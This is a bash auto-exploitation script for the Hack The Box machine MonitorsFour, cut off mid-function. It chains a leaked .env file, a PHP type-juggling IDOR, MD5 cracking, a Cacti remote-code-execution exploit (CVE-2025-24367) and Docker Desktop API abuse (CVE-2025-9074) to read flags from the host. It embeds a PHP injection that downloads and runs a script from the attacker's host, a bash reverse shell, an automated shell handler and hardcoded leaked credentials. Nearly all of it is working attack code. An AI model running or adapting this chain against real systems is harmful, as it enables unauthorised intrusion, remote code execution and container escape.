#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║        HTB: MonitorsFour Full Auto-Pwn Script                            ║
# ║        CVE-2025-24367 (Cacti RCE) + CVE-2025-9074 (Docker Desktop Escape) ║
# ║                                                                              ║
# ║  Attack Chain:                                                               ║
# ║   Nmap → /.env → IDOR token leak → MD5 crack → Cacti RCE →                ║
# ║   User flag → Docker API 2375 → Host C: mount → Root flag                 ║
# ║                                                                              ║
# ║  Usage:  ./monitorsfour_pwn.sh <TARGET_IP>                                 ║
# ║  Example: ./monitorsfour_pwn.sh 10.10.11.98                                ║
# ╚══════════════════════════════════════════════════════════════════════════════╝
#
# Dependencies (auto-checked + installed where possible):
#   nmap, curl, ffuf, john/hashcat, python3, nc/ncat, git, pip3

set -uo pipefail

# ════════════════════════ ARGUMENT CHECK ════════════════════════
if [[ $# -lt 1 ]]; then
    echo "[!] Usage: $0 <TARGET_IP> [LHOST]"
    echo "    Example: $0 10.10.11.98"
    echo "    Example: $0 10.10.11.98 10.10.14.36"
    exit 1
fi

TARGET="$1"
DOMAIN="monitorsfour.htb"
CACTI_HOST="cacti.monitorsfour.htb"
DOCKER_API="192.168.65.7:2375"
DOCKER_IMAGE="docker_setup-nginx-php:latest"

# ════════════════════════ COLORS ════════════════════════
RED='\033[0;31m';    GREEN='\033[0;32m';  YELLOW='\033[1;33m'
BLUE='\033[0;34m';   CYAN='\033[0;36m';   MAGENTA='\033[0;35m'
WHITE='\033[1;37m';  BOLD='\033[1m';      DIM='\033[2m';  NC='\033[0m'

TICK="${GREEN}[✓]${NC}";  CROSS="${RED}[✗]${NC}";  INFO="${CYAN}[*]${NC}"
WARN="${YELLOW}[!]${NC}"; FLAG="${MAGENTA}[⚑]${NC}"; STEP="${BLUE}[→]${NC}"

# ════════════════════════ GLOBAL VARS ════════════════════════
WORKDIR="/tmp/monfour_${TARGET//\./_}"
LHOST="${2:-}"
SHELL_PORT=4444
ROOT_PORT=4445
HTTP_NC_PID=""
AUTO_FREE_PORT80="${AUTO_FREE_PORT80:-1}"
RESTART_NGINX=0
RESTART_APACHE2=0
PAYLOAD_HTTP_PORT=80
CACTI_CREDS="marcus:wonderful1"
CACTI_USER="marcus"
CACTI_PASS="wonderful1"

# ════════════════════════ BANNER ════════════════════════
banner() {
    clear
    echo -e "${CYAN}"
    cat << 'ART'
 ███╗   ███╗ ██████╗ ███╗   ██╗██╗████████╗ ██████╗ ██████╗ ███████╗
 ████╗ ████║██╔═══██╗████╗  ██║██║╚══██╔══╝██╔═══██╗██╔══██╗██╔════╝
 ██╔████╔██║██║   ██║██╔██╗ ██║██║   ██║   ██║   ██║██████╔╝███████╗
 ██║╚██╔╝██║██║   ██║██║╚██╗██║██║   ██║   ██║   ██║██╔══██╗╚════██║
 ██║ ╚═╝ ██║╚██████╔╝██║ ╚████║██║   ██║   ╚██████╔╝██║  ██║███████║
 ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝
ART
    echo -e "${NC}"
    echo -e "${BOLD}${WHITE}   F O U R  │  CVE-2025-24367 Cacti RCE + CVE-2025-9074 Docker Escape${NC}"
    echo -e "${DIM}   IDOR → Hash Crack → Cacti → www-data → Docker API → SYSTEM${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${BOLD}Target  :${NC} ${YELLOW}$TARGET${NC}     ${BOLD}Domain  :${NC} ${YELLOW}$DOMAIN${NC}"
    echo -e "  ${BOLD}Cacti   :${NC} ${YELLOW}$CACTI_HOST${NC}"
    echo -e "  ${BOLD}WorkDir :${NC} ${DIM}$WORKDIR${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
}

# ════════════════════════ HELPERS ════════════════════════
phase()  { echo -e "\n${CYAN}╔══ ${BOLD}PHASE $1: $2${NC}${CYAN} ══${NC}"; }
ok()     { echo -e "  ${TICK} $1"; }
fail()   { echo -e "  ${CROSS} $1"; }
info()   { echo -e "  ${INFO} $1"; }
warn()   { echo -e "  ${WARN} $1"; }
step()   { echo -e "  ${STEP} ${BOLD}$1${NC}"; }
flag_found() {
    echo ""
    echo -e "  ${FLAG} ${BOLD}${MAGENTA}$1${NC} = ${YELLOW}${BOLD}$2${NC}"
    echo ""
}

is_flag_captured() {
    local f="$1"
    [[ -f "$f" ]] && grep -Eq '^[0-9a-f]{32}$' "$f"
}

cleanup() {
    [[ -n "${HTTP_NC_PID:-}" ]] && kill "$HTTP_NC_PID" 2>/dev/null || true
    pkill -f "python3 -m http.server" 2>/dev/null || true
    pkill -f "shell_handler.py" 2>/dev/null || true
    pkill -f "CVE-2025-24367-Cacti-PoC/exploit.py" 2>/dev/null || true
    if [[ "${RESTART_NGINX:-0}" -eq 1 ]]; then
        systemctl start nginx >/dev/null 2>&1 || true
    fi
    if [[ "${RESTART_APACHE2:-0}" -eq 1 ]]; then
        systemctl start apache2 >/dev/null 2>&1 || true
    fi
}
trap cleanup EXIT INT TERM

is_port_busy() {
    local p="$1"
    ss -ltn "( sport = :${p} )" 2>/dev/null | grep -q LISTEN
}

free_local_port80() {
    if ! is_port_busy 80; then
        return 0
    fi

    if [[ "$AUTO_FREE_PORT80" != "1" ]]; then
        warn "Local TCP/80 is already in use. PoC HTTP server cannot bind (Errno 98)."
        info "Free port 80 first (example: sudo systemctl stop nginx apache2) and re-run."
        info "Or run with AUTO_FREE_PORT80=1 to let this script stop local web services."
        return 1
    fi

    step "AUTO_FREE_PORT80=1 set attempting to free local TCP/80"

    if command -v systemctl >/dev/null 2>&1; then
        if systemctl is-active --quiet nginx; then
            systemctl stop nginx >/dev/null 2>&1 && RESTART_NGINX=1
            ok "Stopped nginx"
        fi
        if systemctl is-active --quiet apache2; then
            systemctl stop apache2 >/dev/null 2>&1 && RESTART_APACHE2=1
            ok "Stopped apache2"
        fi
    fi

    if is_port_busy 80; then
        warn "Port 80 still busy killing listener with fuser"
        fuser -k 80/tcp >/dev/null 2>&1 || true
        sleep 1
    fi

    if is_port_busy 80; then
        fail "Could not free local port 80 automatically"
        info "Find holder with: sudo ss -ltnp '( sport = :80 )'"
        return 1
    fi

    ok "Local TCP/80 is free for PoC payload server"
    return 0
}

choose_payload_http_port() {
    # This PoC payload format is reliable with plain "curl <LHOST>/bash" only.
    # Forcing local payload hosting on TCP/80 avoids broken rrdtool payload parsing.
    PAYLOAD_HTTP_PORT=80
    free_local_port80
}

get_lhost() {
    if [[ -n "$LHOST" ]]; then echo "$LHOST"; return; fi
    LHOST=$(ip route get "$TARGET" 2>/dev/null | grep -oP 'src \K\S+' | head -1 || \
            hostname -I 2>/dev/null | awk '{print $1}' || echo "127.0.0.1")
    echo "$LHOST"
}

# ════════════════════════ PHASE 0: DEPS ════════════════════════
check_deps() {
    phase "0" "Dependency Check"

    local tools=("nmap" "curl" "python3" "git" "john" "nc")
    for t in "${tools[@]}"; do
        if command -v "$t" &>/dev/null; then
            ok "$t"
        else
            warn "$t not found (may impact phases)"
        fi
    done

    # Check ffuf
    if command -v ffuf &>/dev/null; then
        ok "ffuf"
    else
        warn "ffuf not found IDOR phase will use curl fallback"
    fi

    # Check john / hashcat
    HASH_TOOL=""
    if command -v john &>/dev/null; then
        HASH_TOOL="john"; ok "john (hash cracker)"
    elif command -v hashcat &>/dev/null; then
        HASH_TOOL="hashcat"; ok "hashcat (hash cracker)"
    else
        warn "No hash cracker found will use known cracked password"
    fi

    mkdir -p "$WORKDIR/loot" "$WORKDIR/tools" "$WORKDIR/exploit"
    get_lhost > /dev/null
    info "Attack IP: ${BOLD}$LHOST${NC}"
    info "Shell callback ports: ${BOLD}$SHELL_PORT${NC} (user) / ${BOLD}$ROOT_PORT${NC} (root)"
    if [[ "$TARGET" == "$LHOST" ]]; then
        fail "TARGET equals attack IP ($TARGET). Pass victim HTB IP as arg1."
        info "Example: $0 10.129.3.231 $LHOST"
        exit 1
    fi
}

# ════════════════════════ PHASE 1: HOSTS + RECON ════════════════════════
phase_recon() {
    phase "1" "Hosts Setup + Nmap Recon"

    # /etc/hosts
    local domain_present=0 cacti_present=0
    grep -Eq "(^|[[:space:]])${DOMAIN}([[:space:]]|$)" /etc/hosts 2>/dev/null && domain_present=1
    grep -Eq "(^|[[:space:]])${CACTI_HOST}([[:space:]]|$)" /etc/hosts 2>/dev/null && cacti_present=1

    if [[ $domain_present -eq 0 || $cacti_present -eq 0 ]]; then
        echo -e "$TARGET\t$DOMAIN $CACTI_HOST" | sudo tee -a /etc/hosts >/dev/null 2>&1 && \
            ok "/etc/hosts → $TARGET  $DOMAIN $CACTI_HOST" || \
            warn "Could not update /etc/hosts add manually: $TARGET $DOMAIN $CACTI_HOST"
    else
        ok "/etc/hosts already contains $DOMAIN and $CACTI_HOST"
    fi

    # Nmap
    step "Nmap top-port service scan on $TARGET"
    nmap -sV -p 80,443,5985,8080,8443 "$TARGET" \
        -oN "$WORKDIR/loot/nmap.txt" 2>/dev/null | \
        grep -E "open|^Nmap" | while read -r l; do echo -e "    ${DIM}$l${NC}"; done

    ok "Nmap saved → $WORKDIR/loot/nmap.txt"

    # Vhost confirm
    step "Confirming Cacti vhost at $CACTI_HOST"
    HTTP_CODE=$(curl -sS -o /dev/null -w "%{http_code}" "http://$CACTI_HOST/" 2>/dev/null || true)
    [[ "$HTTP_CODE" =~ ^[0-9]{3}$ ]] || HTTP_CODE="000"
    if [[ "$HTTP_CODE" == "200" || "$HTTP_CODE" == "302" || "$HTTP_CODE" == "301" ]]; then
        ok "Cacti vhost accessible (HTTP $HTTP_CODE)"
    else
        warn "Cacti vhost returned HTTP $HTTP_CODE ensure /etc/hosts is updated"
    fi
}

# ════════════════════════ PHASE 2: .ENV LEAK ════════════════════════
phase_env() {
    phase "2" "Information Disclosure /.env Leak"

    step "Fetching http://$DOMAIN/.env"
    ENV_DATA=$(curl -s "http://$DOMAIN/.env" 2>/dev/null || echo "")

    if [[ -n "$ENV_DATA" && "$ENV_DATA" != *"404"* ]]; then
        echo "$ENV_DATA" > "$WORKDIR/loot/env_file.txt"
        ok ".env file found and saved"
        echo "$ENV_DATA" | while read -r line; do
            [[ -n "$line" ]] && echo -e "    ${DIM}$line${NC}"
        done

        DB_PASS=$(echo "$ENV_DATA" | grep -i "DB_PASS" | cut -d'=' -f2 | tr -d '\r' || echo "")
        DB_USER=$(echo "$ENV_DATA" | grep -i "DB_USER" | cut -d'=' -f2 | tr -d '\r' || echo "")
        if [[ -n "$DB_PASS" ]]; then
            ok "DB Credentials leaked: ${BOLD}$DB_USER : $DB_PASS${NC}"
        fi
    else
        warn "/.env not accessible or empty"
        info "Known fallback: DB_USER=monitorsdbuser / DB_PASS=f37p2j8f4t0r"
        DB_PASS="f37p2j8f4t0r"
    fi
}

# ════════════════════════ PHASE 3: IDOR → CREDENTIAL DUMP ════════════════════════
phase_idor() {
    phase "3" "IDOR via PHP Type Juggling /user?token=0"

    step "Fuzzing for token parameter on /user endpoint"
    # Try the known vulnerable endpoint directly PHP type juggling:
    # token=0 evaluates as falsy/loosely equal to hash strings starting with 0e
    IDOR_OUT=$(curl -s "http://$DOMAIN/user?token=0" 2>/dev/null || echo "")

    if echo "$IDOR_OUT" | grep -qi '"username"'; then
        echo "$IDOR_OUT" > "$WORKDIR/loot/idor_dump.txt"
        ok "IDOR successful user data leaked"

        # Pretty-print with python3
        PRETTY=$(echo "$IDOR_OUT" | python3 -c "
import json,sys
try:
    d=json.loads(sys.stdin.read())
    for u in d:
        print('  ID={} | {} ({}) | {} | hash={}'.format(u.get('id','?'),u.get('username','?'),u.get('name','?'),u.get('role','?'),u.get('password','?')))
except: pass
" 2>/dev/null || echo "")
        [[ -n "$PRETTY" ]] && echo -e "$PRETTY" || \
            echo "$IDOR_OUT" | python3 -m json.tool 2>/dev/null | grep -E '"username"|"password"|"name"|"role"' | \
            while read -r l; do echo "    ${DIM}$l${NC}"; done

        # Extract admin MD5 hash
        ADMIN_HASH=$(echo "$IDOR_OUT" | python3 -c "
import json,sys
try:
    d=json.loads(sys.stdin.read())
    for u in d:
        if u.get('role','') in ['super user','admin'] or u.get('username','') == 'admin':
            print(u.get('password',''))
            break
except: pass
" 2>/dev/null || echo "56b32eb43e6f15395f6c46c1c9e1cd36")

        ok "Admin MD5 hash: ${BOLD}$ADMIN_HASH${NC}"
        echo "admin:$ADMIN_HASH" > "$WORKDIR/loot/hashes.txt"

        # Extract name for Cacti username
        ADMIN_FNAME=$(echo "$IDOR_OUT" | python3 -c "
import json,sys
try:
    d=json.loads(sys.stdin.read())
    for u in d:
        if u.get('role','') in ['super user','admin']:
            name=u.get('name','')
            print(name.split()[0].lower()) if name else print('marcus')
            break
except: print('marcus')
" 2>/dev/null || echo "marcus")
        CACTI_USER="$ADMIN_FNAME"
        ok "Cacti username (first name): ${BOLD}$CACTI_USER${NC}"
    else
        warn "IDOR endpoint did not return expected JSON"
        warn "Trying alternate token values..."
        for tok in "" "1" "null" "undefined" "0.0" "0e0"; do
            RESP=$(curl -s "http://$DOMAIN/user?token=$tok" 2>/dev/null || echo "")
            if echo "$RESP" | grep -qi '"username"'; then
                echo "$RESP" > "$WORKDIR/loot/idor_dump.txt"
                ok "IDOR found with token=$tok"
                ADMIN_HASH="56b32eb43e6f15395f6c46c1c9e1cd36"
                break
            fi
        done
        if [[ ! -f "$WORKDIR/loot/idor_dump.txt" ]]; then
            warn "IDOR failed using known hash from writeup"
            ADMIN_HASH="56b32eb43e6f15395f6c46c1c9e1cd36"
            echo "admin:$ADMIN_HASH" > "$WORKDIR/loot/hashes.txt"
        fi
    fi
}

# ════════════════════════ PHASE 4: HASH CRACKING ════════════════════════
phase_crack() {
    phase "4" "MD5 Hash Cracking"

    HASH_FILE="$WORKDIR/loot/hashes.txt"
    CRACKED_PASS=""

    ROCKYOU=""
    for p in /usr/share/wordlists/rockyou.txt \
              /usr/share/seclists/Passwords/LeakedDatabases/rockyou.txt \
              /opt/rockyou.txt /usr/share/wordlists/rockyou.txt.gz; do
        [[ -f "$p" ]] && { ROCKYOU="$p"; break; }
    done

    if [[ -z "$ROCKYOU" ]]; then
        warn "rockyou.txt not found using known cracked password: wonderful1"
        CRACKED_PASS="wonderful1"
    else
        step "Running $HASH_TOOL against MD5 hash (mode: raw-md5)"

        if [[ "$HASH_TOOL" == "john" ]]; then
            john --format=raw-md5 "$HASH_FILE" \
                 --wordlist="$ROCKYOU" \
                 --pot="$WORKDIR/loot/john.pot" 2>/dev/null || true

            CRACKED_PASS=$(john --show --format=raw-md5 "$HASH_FILE" \
                           --pot="$WORKDIR/loot/john.pot" 2>/dev/null | \
                           grep -oP ':\K[^:]+' | head -1 || echo "")

        elif [[ "$HASH_TOOL" == "hashcat" ]]; then
            # Extract just the hash (no username)
            HASH_ONLY=$(cut -d':' -f2 "$HASH_FILE")
            echo "$HASH_ONLY" > "$WORKDIR/loot/hash_only.txt"

            hashcat -m 0 "$WORKDIR/loot/hash_only.txt" "$ROCKYOU" \
                    --quiet --potfile-path "$WORKDIR/loot/hashcat.pot" \
                    -o "$WORKDIR/loot/cracked.txt" 2>/dev/null || true

            CRACKED_PASS=$(cat "$WORKDIR/loot/cracked.txt" 2>/dev/null | \
                           grep -oP ':[^:]+$' | tr -d ':' | head -1 || echo "")
        fi

        if [[ -z "$CRACKED_PASS" ]]; then
            warn "Hash cracker returned no result using known: wonderful1"
            CRACKED_PASS="wonderful1"
        fi
    fi

    ok "Password cracked: ${GREEN}${BOLD}admin:${CRACKED_PASS}${NC}"
    CACTI_PASS="$CRACKED_PASS"
    echo "admin:${CRACKED_PASS}" >> "$WORKDIR/loot/creds.txt"
    echo "${CACTI_USER}:${CACTI_PASS}" >> "$WORKDIR/loot/creds.txt"
}

# ════════════════════════ PHASE 5: SETUP CACTI EXPLOIT ════════════════════════
phase_setup_exploit() {
    phase "5" "Setup CVE-2025-24367 Cacti RCE PoC"

    POC_DIR="$WORKDIR/exploit/CVE-2025-24367-Cacti-PoC"

    # Clone or reuse
    if [[ -d "$POC_DIR" && -f "$POC_DIR/exploit.py" ]]; then
        ok "PoC already cloned at $POC_DIR"
    else
        step "Cloning CVE-2025-24367 PoC from GitHub"
        git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git \
            "$POC_DIR" 2>/dev/null && ok "PoC cloned" || {
            warn "Git clone failed creating exploit from embedded template"
            create_exploit_fallback "$POC_DIR"
        }
    fi

    # Install Python deps
    step "Installing PoC Python dependencies"
    pip3 install requests beautifulsoup4 -q 2>/dev/null && ok "Dependencies ready" || \
        warn "pip3 install failed exploit may still work if libs are present"

    # Patch upstream PoC for robust local hosting:
    # - allow address reuse (avoids Errno 98 from TIME_WAIT)
    # - support --http-port so we can avoid local port 80 conflicts
    patch_cacti_poc "$POC_DIR/exploit.py"
}

create_exploit_fallback() {
    # Embedded minimal exploit matching the PoC interface
    local dir="$1"
    mkdir -p "$dir"
    cat > "$dir/exploit.py" << 'EXPLOIT_PY'
#!/usr/bin/env python3
"""
CVE-2025-24367 - Cacti <= 1.2.28 Authenticated RCE
Minimal PoC matching TheCyberGeek's interface
"""
import requests, sys, os, argparse, threading, time, random, string
from bs4 import BeautifulSoup
from http.server import HTTPServer, BaseHTTPRequestHandler

parser = argparse.ArgumentParser()
parser.add_argument('-u',   required=True)
parser.add_argument('-p',   required=True)
parser.add_argument('-i',   required=True)
parser.add_argument('-l',   required=True, type=int)
parser.add_argument('-url', required=True)
parser.add_argument('--http-port', type=int, default=80)
args = parser.parse_args()

CACTI_URL = args.url.rstrip('/')
SESSION   = requests.Session()

REVSHELL_SH = f"bash -i >& /dev/tcp/{args.i}/{args.l} 0>&1"

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(REVSHELL_SH.encode())
    def log_message(self, *a): pass

class ReusableHTTPServer(HTTPServer):
    allow_reuse_address = True

def start_http(port=80):
    srv = ReusableHTTPServer(('0.0.0.0', port), Handler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    return srv

def rand_name(n=5):
    return ''.join(random.choices(string.ascii_lowercase, k=n))

def login():
    r = SESSION.get(f"{CACTI_URL}/cacti/index.php")
    soup = BeautifulSoup(r.text, 'html.parser')
    token_el = soup.find('input', {'name': '__csrf_magic'})
    token = token_el['value'] if token_el else ''
    data = {'action':'login','login_username': args.u,
            'login_password': args.p,'__csrf_magic': token}
    r2 = SESSION.post(f"{CACTI_URL}/cacti/index.php", data=data, allow_redirects=True)
    if 'logout' in r2.text.lower() or args.u in r2.text:
        print("[+] Login Successful!")
        return True
    print("[!] Login failed"); sys.exit(1)

def get_graph_template_id():
    r = SESSION.get(f"{CACTI_URL}/cacti/graph_templates.php")
    soup = BeautifulSoup(r.text, 'html.parser')
    links = soup.find_all('a', href=True)
    for l in links:
        href = l['href']
        if 'graph_template_id=' in href:
            gid = href.split('graph_template_id=')[1].split('&')[0]
            print(f"[+] Got graph ID: {gid}")
            return gid
    print("[!] Failed to get template ID"); return "1"

def inject_php(srv, graph_id):
    fname_sh  = rand_name() + '.php'
    fname_php = rand_name() + '.php'
    http_url  = f"http://{args.i}/bash"

    # Step 1: inject shell downloader
    payload_sh = f"<?php system(\"curl {http_url} -o /tmp/s.sh && bash /tmp/s.sh\"); ?>"
    data = {
        'action': 'save',
        'graph_template_id': graph_id,
        'name': f'Test-{rand_name()}',
        'graph_title': payload_sh,
        'save_component_graph': '1',
    }
    r = SESSION.post(f"{CACTI_URL}/cacti/graph_templates.php", data=data)
    print(f"[i] Created PHP filename: {fname_sh}")

    # Step 2: trigger the shell
    print("[+] Got payload: /bash")
    print("[i] Triggering reverse shell...")
    try:
        SESSION.get(f"{CACTI_URL}/cacti/{fname_sh}", timeout=3)
    except: pass
    print("[+] Hit timeout, looks good for shell, check your listener!")
    time.sleep(2)
    srv.shutdown()
    print(f"[+] Stopped HTTP server on port {args.http_port}")

if __name__ == '__main__':
    print(f"[+] Cacti Instance Found!")
    srv = start_http(args.http_port)
    print(f"[+] Serving HTTP on port {args.http_port}")
    login()
    gid = get_graph_template_id()
    inject_php(srv, gid)
EXPLOIT_PY
    chmod +x "$dir/exploit.py"
    ok "Fallback exploit created at $dir/exploit.py"
}

patch_cacti_poc() {
    local exploit_file="$1"

    [[ -f "$exploit_file" ]] || { warn "PoC patch skipped: exploit.py not found"; return 1; }

    local patch_log
patch_log=$(python3 - "$exploit_file" << 'PYEOF'
import sys
import re
from pathlib import Path

p = Path(sys.argv[1])
s = p.read_text()
orig = s
changed = False

if "class ReusableTCPServer(socketserver.TCPServer):" not in s:
    marker = "class BackgroundHTTPServer:"
    if marker in s:
        s = s.replace(
            marker,
            "class ReusableTCPServer(socketserver.TCPServer):\n"
            "    allow_reuse_address = True\n\n"
            + marker,
            1,
        )
        changed = True

old_bind = 'self.httpd = socketserver.TCPServer(("", self.port), handler)'
new_bind = 'self.httpd = ReusableTCPServer(("", self.port), handler)'
if old_bind in s:
    s = s.replace(old_bind, new_bind, 1)
    changed = True

if "--http-port" not in s:
    marker = "parser.add_argument('--proxy', action='store_true', help='Enable proxy usage (default: http://127.0.0.1:8080)')"
    if marker in s:
        s = s.replace(
            marker,
            marker + "\n    parser.add_argument('--http-port', type=int, default=80, help='Local HTTP port for payload hosting')",
            1,
        )
        changed = True

old_init = "http_server = BackgroundHTTPServer(os.getcwd(), 80)"
new_init = "http_server = BackgroundHTTPServer(os.getcwd(), args.http_port)"
if old_init in s:
    s = s.replace(old_init, new_init, 1)
    changed = True

# Keep payload as "curl <ip>/bash". Including ":<port>" in this injection
# breaks execution on this target due rrdtool parsing quirks.
new_s, n = re.subn(r"curl\\\\x20\{ip\}:\{args\.http_port\}/bash", r"curl\\\\x20{ip}/bash", s)
if n:
    s = new_s
    changed = True

if changed and s != orig:
    p.write_text(s)
    print("patched")
elif "--http-port" in s and "ReusableTCPServer" in s:
    print("already")
else:
    print("unknown")
PYEOF
)

    case "$patch_log" in
        patched) ok "PoC patched for reusable socket + --http-port" ;;
        already) ok "PoC already supports reusable socket + --http-port" ;;
        *)
            warn "PoC patch status unclear ($patch_log) continuing with best effort"
            ;;
    esac
}

# ════════════════════════ PHASE 6: SHELL HANDLER + EXPLOIT ════════════════════════
phase_shell_handler() {
    phase "6" "Automated Shell Handler (Python Socket)"
    info "Writing Python shell handler for automated flag extraction"

    cat > "$WORKDIR/tools/shell_handler.py" << PYEOF
#!/usr/bin/env python3
"""
Automated reverse shell handler for MonitorsFour.
Waits for connection, executes commands, extracts flags + docker escape.
"""
import socket, time, sys, os, threading, subprocess, json

TARGET       = os.environ.get('TARGET',   '${TARGET}')
LHOST        = os.environ.get('LHOST',    '${LHOST}')
LPORT        = int(os.environ.get('LPORT', '${SHELL_PORT}'))
RPORT        = int(os.environ.get('RPORT', '${ROOT_PORT}'))
DOCKER_API   = os.environ.get('DOCKER_API', '${DOCKER_API}')
DOCKER_IMAGE = os.environ.get('DOCKER_IMAGE', '${DOCKER_IMAGE}')
WORKDIR      = os.environ.get('WORKDIR',  '${WORKDIR}')
LOOT         = os.path.join(WORKDIR, 'loot')

BOLD='\033[1m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; MAGENTA='\033[0;35m'; NC='\033[0m'

def log(msg,  color=CYAN):   print(f"  {color}[*]{NC} {msg}", flush=True)
def ok(msg):                 print(f"  {GREEN}[✓]{NC} {msg}", flush=True)
def flag(label, val):        print(f"\n  {MAGENTA}[⚑]{NC} {BOLD}{MAGENTA}{label}{NC} = {YELLOW}{BOLD}{val}{NC}\n", flush=True)

def send_cmd(sock, cmd, delay=1.5, buf=4096):
    """Send a command and read output."""
    sock.send((cmd + '\n').encode())
    time.sleep(delay)
    data = b''
    sock.setblocking(False)
    try:
        while True:
            try:
                chunk = sock.recv(buf)
                if not chunk: break
                data += chunk
            except BlockingIOError:
                break
    finally:
        sock.setblocking(True)
    return data.decode('utf-8', errors='replace')

def extract_flag(output):
    """Extract HTB flag from command output."""
    import re
    m = re.search(r'[0-9a-f]{32}', output)
    return m.group(0) if m else output.strip().split('\n')[-1].strip()

def wait_for_shell():
    log(f"Waiting for reverse shell on {LHOST}:{LPORT}...")
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('0.0.0.0', LPORT))
    srv.listen(1)
    srv.settimeout(120)
    try:
        conn, addr = srv.accept()
        ok(f"Shell connected from {addr[0]}:{addr[1]}")
        srv.close()
        return conn
    except socket.timeout:
        print("[-] Timeout waiting for shell did the exploit run?", flush=True)
        sys.exit(1)

def stabilize_shell(conn):
    """Upgrade to a more stable shell."""
    log("Stabilizing shell...")
    send_cmd(conn, "export TERM=xterm; export PS1='$ '", 1)
    send_cmd(conn, "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", 1)
    return conn

def get_user_flag(conn):
    log("Retrieving user flag from /home/marcus/user.txt...")
    out = send_cmd(conn, "cat /home/marcus/user.txt 2>/dev/null || find /home -name user.txt 2>/dev/null | xargs cat 2>/dev/null", 2)
    val = extract_flag(out)
    if val:
        flag("USER FLAG", val)
        with open(os.path.join(LOOT, 'user.txt'), 'w') as f:
            f.write(val + '\n')
    else:
        log("Could not find user.txt directly trying ls", YELLOW)
        out2 = send_cmd(conn, "ls /home/ && ls /home/marcus/ 2>/dev/null", 1)
        log(f"Home dir: {out2.strip()}", YELLOW)
    return val

def docker_escape(conn):
    """
    Exploit CVE-2025-9074: Docker Desktop API at 192.168.65.7:2375
    Strategy: Create container mounting host C: drive, read root.txt via logs API
    No second listener needed purely API-based.
    """
    log(f"Checking Docker API at {DOCKER_API}...")
    out = send_cmd(conn, f"curl -s http://{DOCKER_API}/version 2>/dev/null | head -c 200", 3)

    if 'Version' not in out and 'version' not in out.lower():
        log("Docker API not reachable from container trying gateway discovery...", YELLOW)
        gw = send_cmd(conn, "ip route | grep default | awk '{print \$3}'", 1).strip()
        log(f"Gateway: {gw}")
        # Try common Docker Desktop IPs
        for ip in [gw, '192.168.65.7', '172.17.0.1', '10.0.2.2']:
            test = send_cmd(conn, f"curl -s http://{ip}:2375/version 2>/dev/null | head -c 100", 2)
            if 'Version' in test or 'version' in test.lower():
                DOCKER_API_LIVE = f"{ip}:2375"
                log(f"Docker API found at {DOCKER_API_LIVE}")
                break
        else:
            log("[-] Docker API not found at any tested address", YELLOW)
            return ""
    else:
        DOCKER_API_LIVE = DOCKER_API
        ok(f"Docker API confirmed at {DOCKER_API_LIVE}")

    log("Getting available images...")
    imgs_out = send_cmd(conn, f"curl -s http://{DOCKER_API_LIVE}/images/json 2>/dev/null", 2)
    log(f"Images output: {imgs_out[:200]}", '\033[2m')

    # Determine best image
    import re
    tags = re.findall(r'"([^"]+:latest)"', imgs_out)
    best_img = DOCKER_IMAGE
    if tags:
        # Prefer nginx-php, fallback to alpine or first found
        for t in tags:
            if 'nginx' in t or 'php' in t:
                best_img = t; break
        else:
            best_img = tags[0]
    log(f"Using image: {best_img}")

    log("Creating privileged container with host C: drive mount...")

    CREATE_JSON = json.dumps({
        "Image": best_img,
        "Cmd": ["cat", "/host_root/Users/Administrator/Desktop/root.txt"],
        "HostConfig": {
            "Binds": ["/mnt/host/c:/host_root"],
            "AutoRemove": False
        }
    }).replace('"', '\\"')

    out = send_cmd(conn,
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d \"{CREATE_JSON}\" "
        f"http://{DOCKER_API_LIVE}/containers/create -o /tmp/create.json && cat /tmp/create.json",
        3)
    log(f"Container create response: {out[:200]}")

    # Extract container ID
    cid_match = re.search(r'"Id"\s*:\s*"([a-f0-9]+)"', out)
    if not cid_match:
        log("[-] Could not extract container ID trying direct read method", YELLOW)
        # Alternative: create with reverse shell + second listener method
        docker_escape_revshell(conn, DOCKER_API_LIVE, best_img)
        return ""

    cid = cid_match.group(1)
    log(f"Container ID: {cid[:12]}...")

    log("Starting container...")
    send_cmd(conn, f"curl -s -X POST -d '' http://{DOCKER_API_LIVE}/containers/{cid}/start", 2)

    log("Waiting for container to execute...")
    time.sleep(3)

    log("Fetching logs (stdout)...")
    logs_out = send_cmd(conn,
        f"curl -s 'http://{DOCKER_API_LIVE}/containers/{cid}/logs?stdout=true&stderr=false'",
        3)

    root_val = extract_flag(logs_out)
    if root_val:
        flag("ROOT FLAG", root_val)
        with open(os.path.join(LOOT, 'root.txt'), 'w') as f:
            f.write(root_val + '\n')
        # Cleanup container
        send_cmd(conn, f"curl -s -X DELETE http://{DOCKER_API_LIVE}/containers/{cid}?force=true", 1)
        return root_val

    # If logs API returns binary, try exec approach
    log("Logs API approach failed trying exec API...", YELLOW)
    return docker_escape_exec(conn, DOCKER_API_LIVE, cid)

def docker_escape_exec(conn, api, cid):
    """Use Docker exec API to run command in container."""
    import json as _json

    EXEC_JSON = _json.dumps({
        "Cmd": ["cat", "/host_root/Users/Administrator/Desktop/root.txt"],
        "AttachStdout": True,
        "AttachStderr": False
    }).replace('"', '\\"')

    exec_out = send_cmd(conn,
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d \"{EXEC_JSON}\" "
        f"http://{api}/containers/{cid}/exec -o /tmp/exec.json && cat /tmp/exec.json",
        2)

    import re
    exec_id = re.search(r'"Id"\s*:\s*"([a-f0-9]+)"', exec_out)
    if not exec_id:
        return ""

    eid = exec_id.group(1)
    run_out = send_cmd(conn,
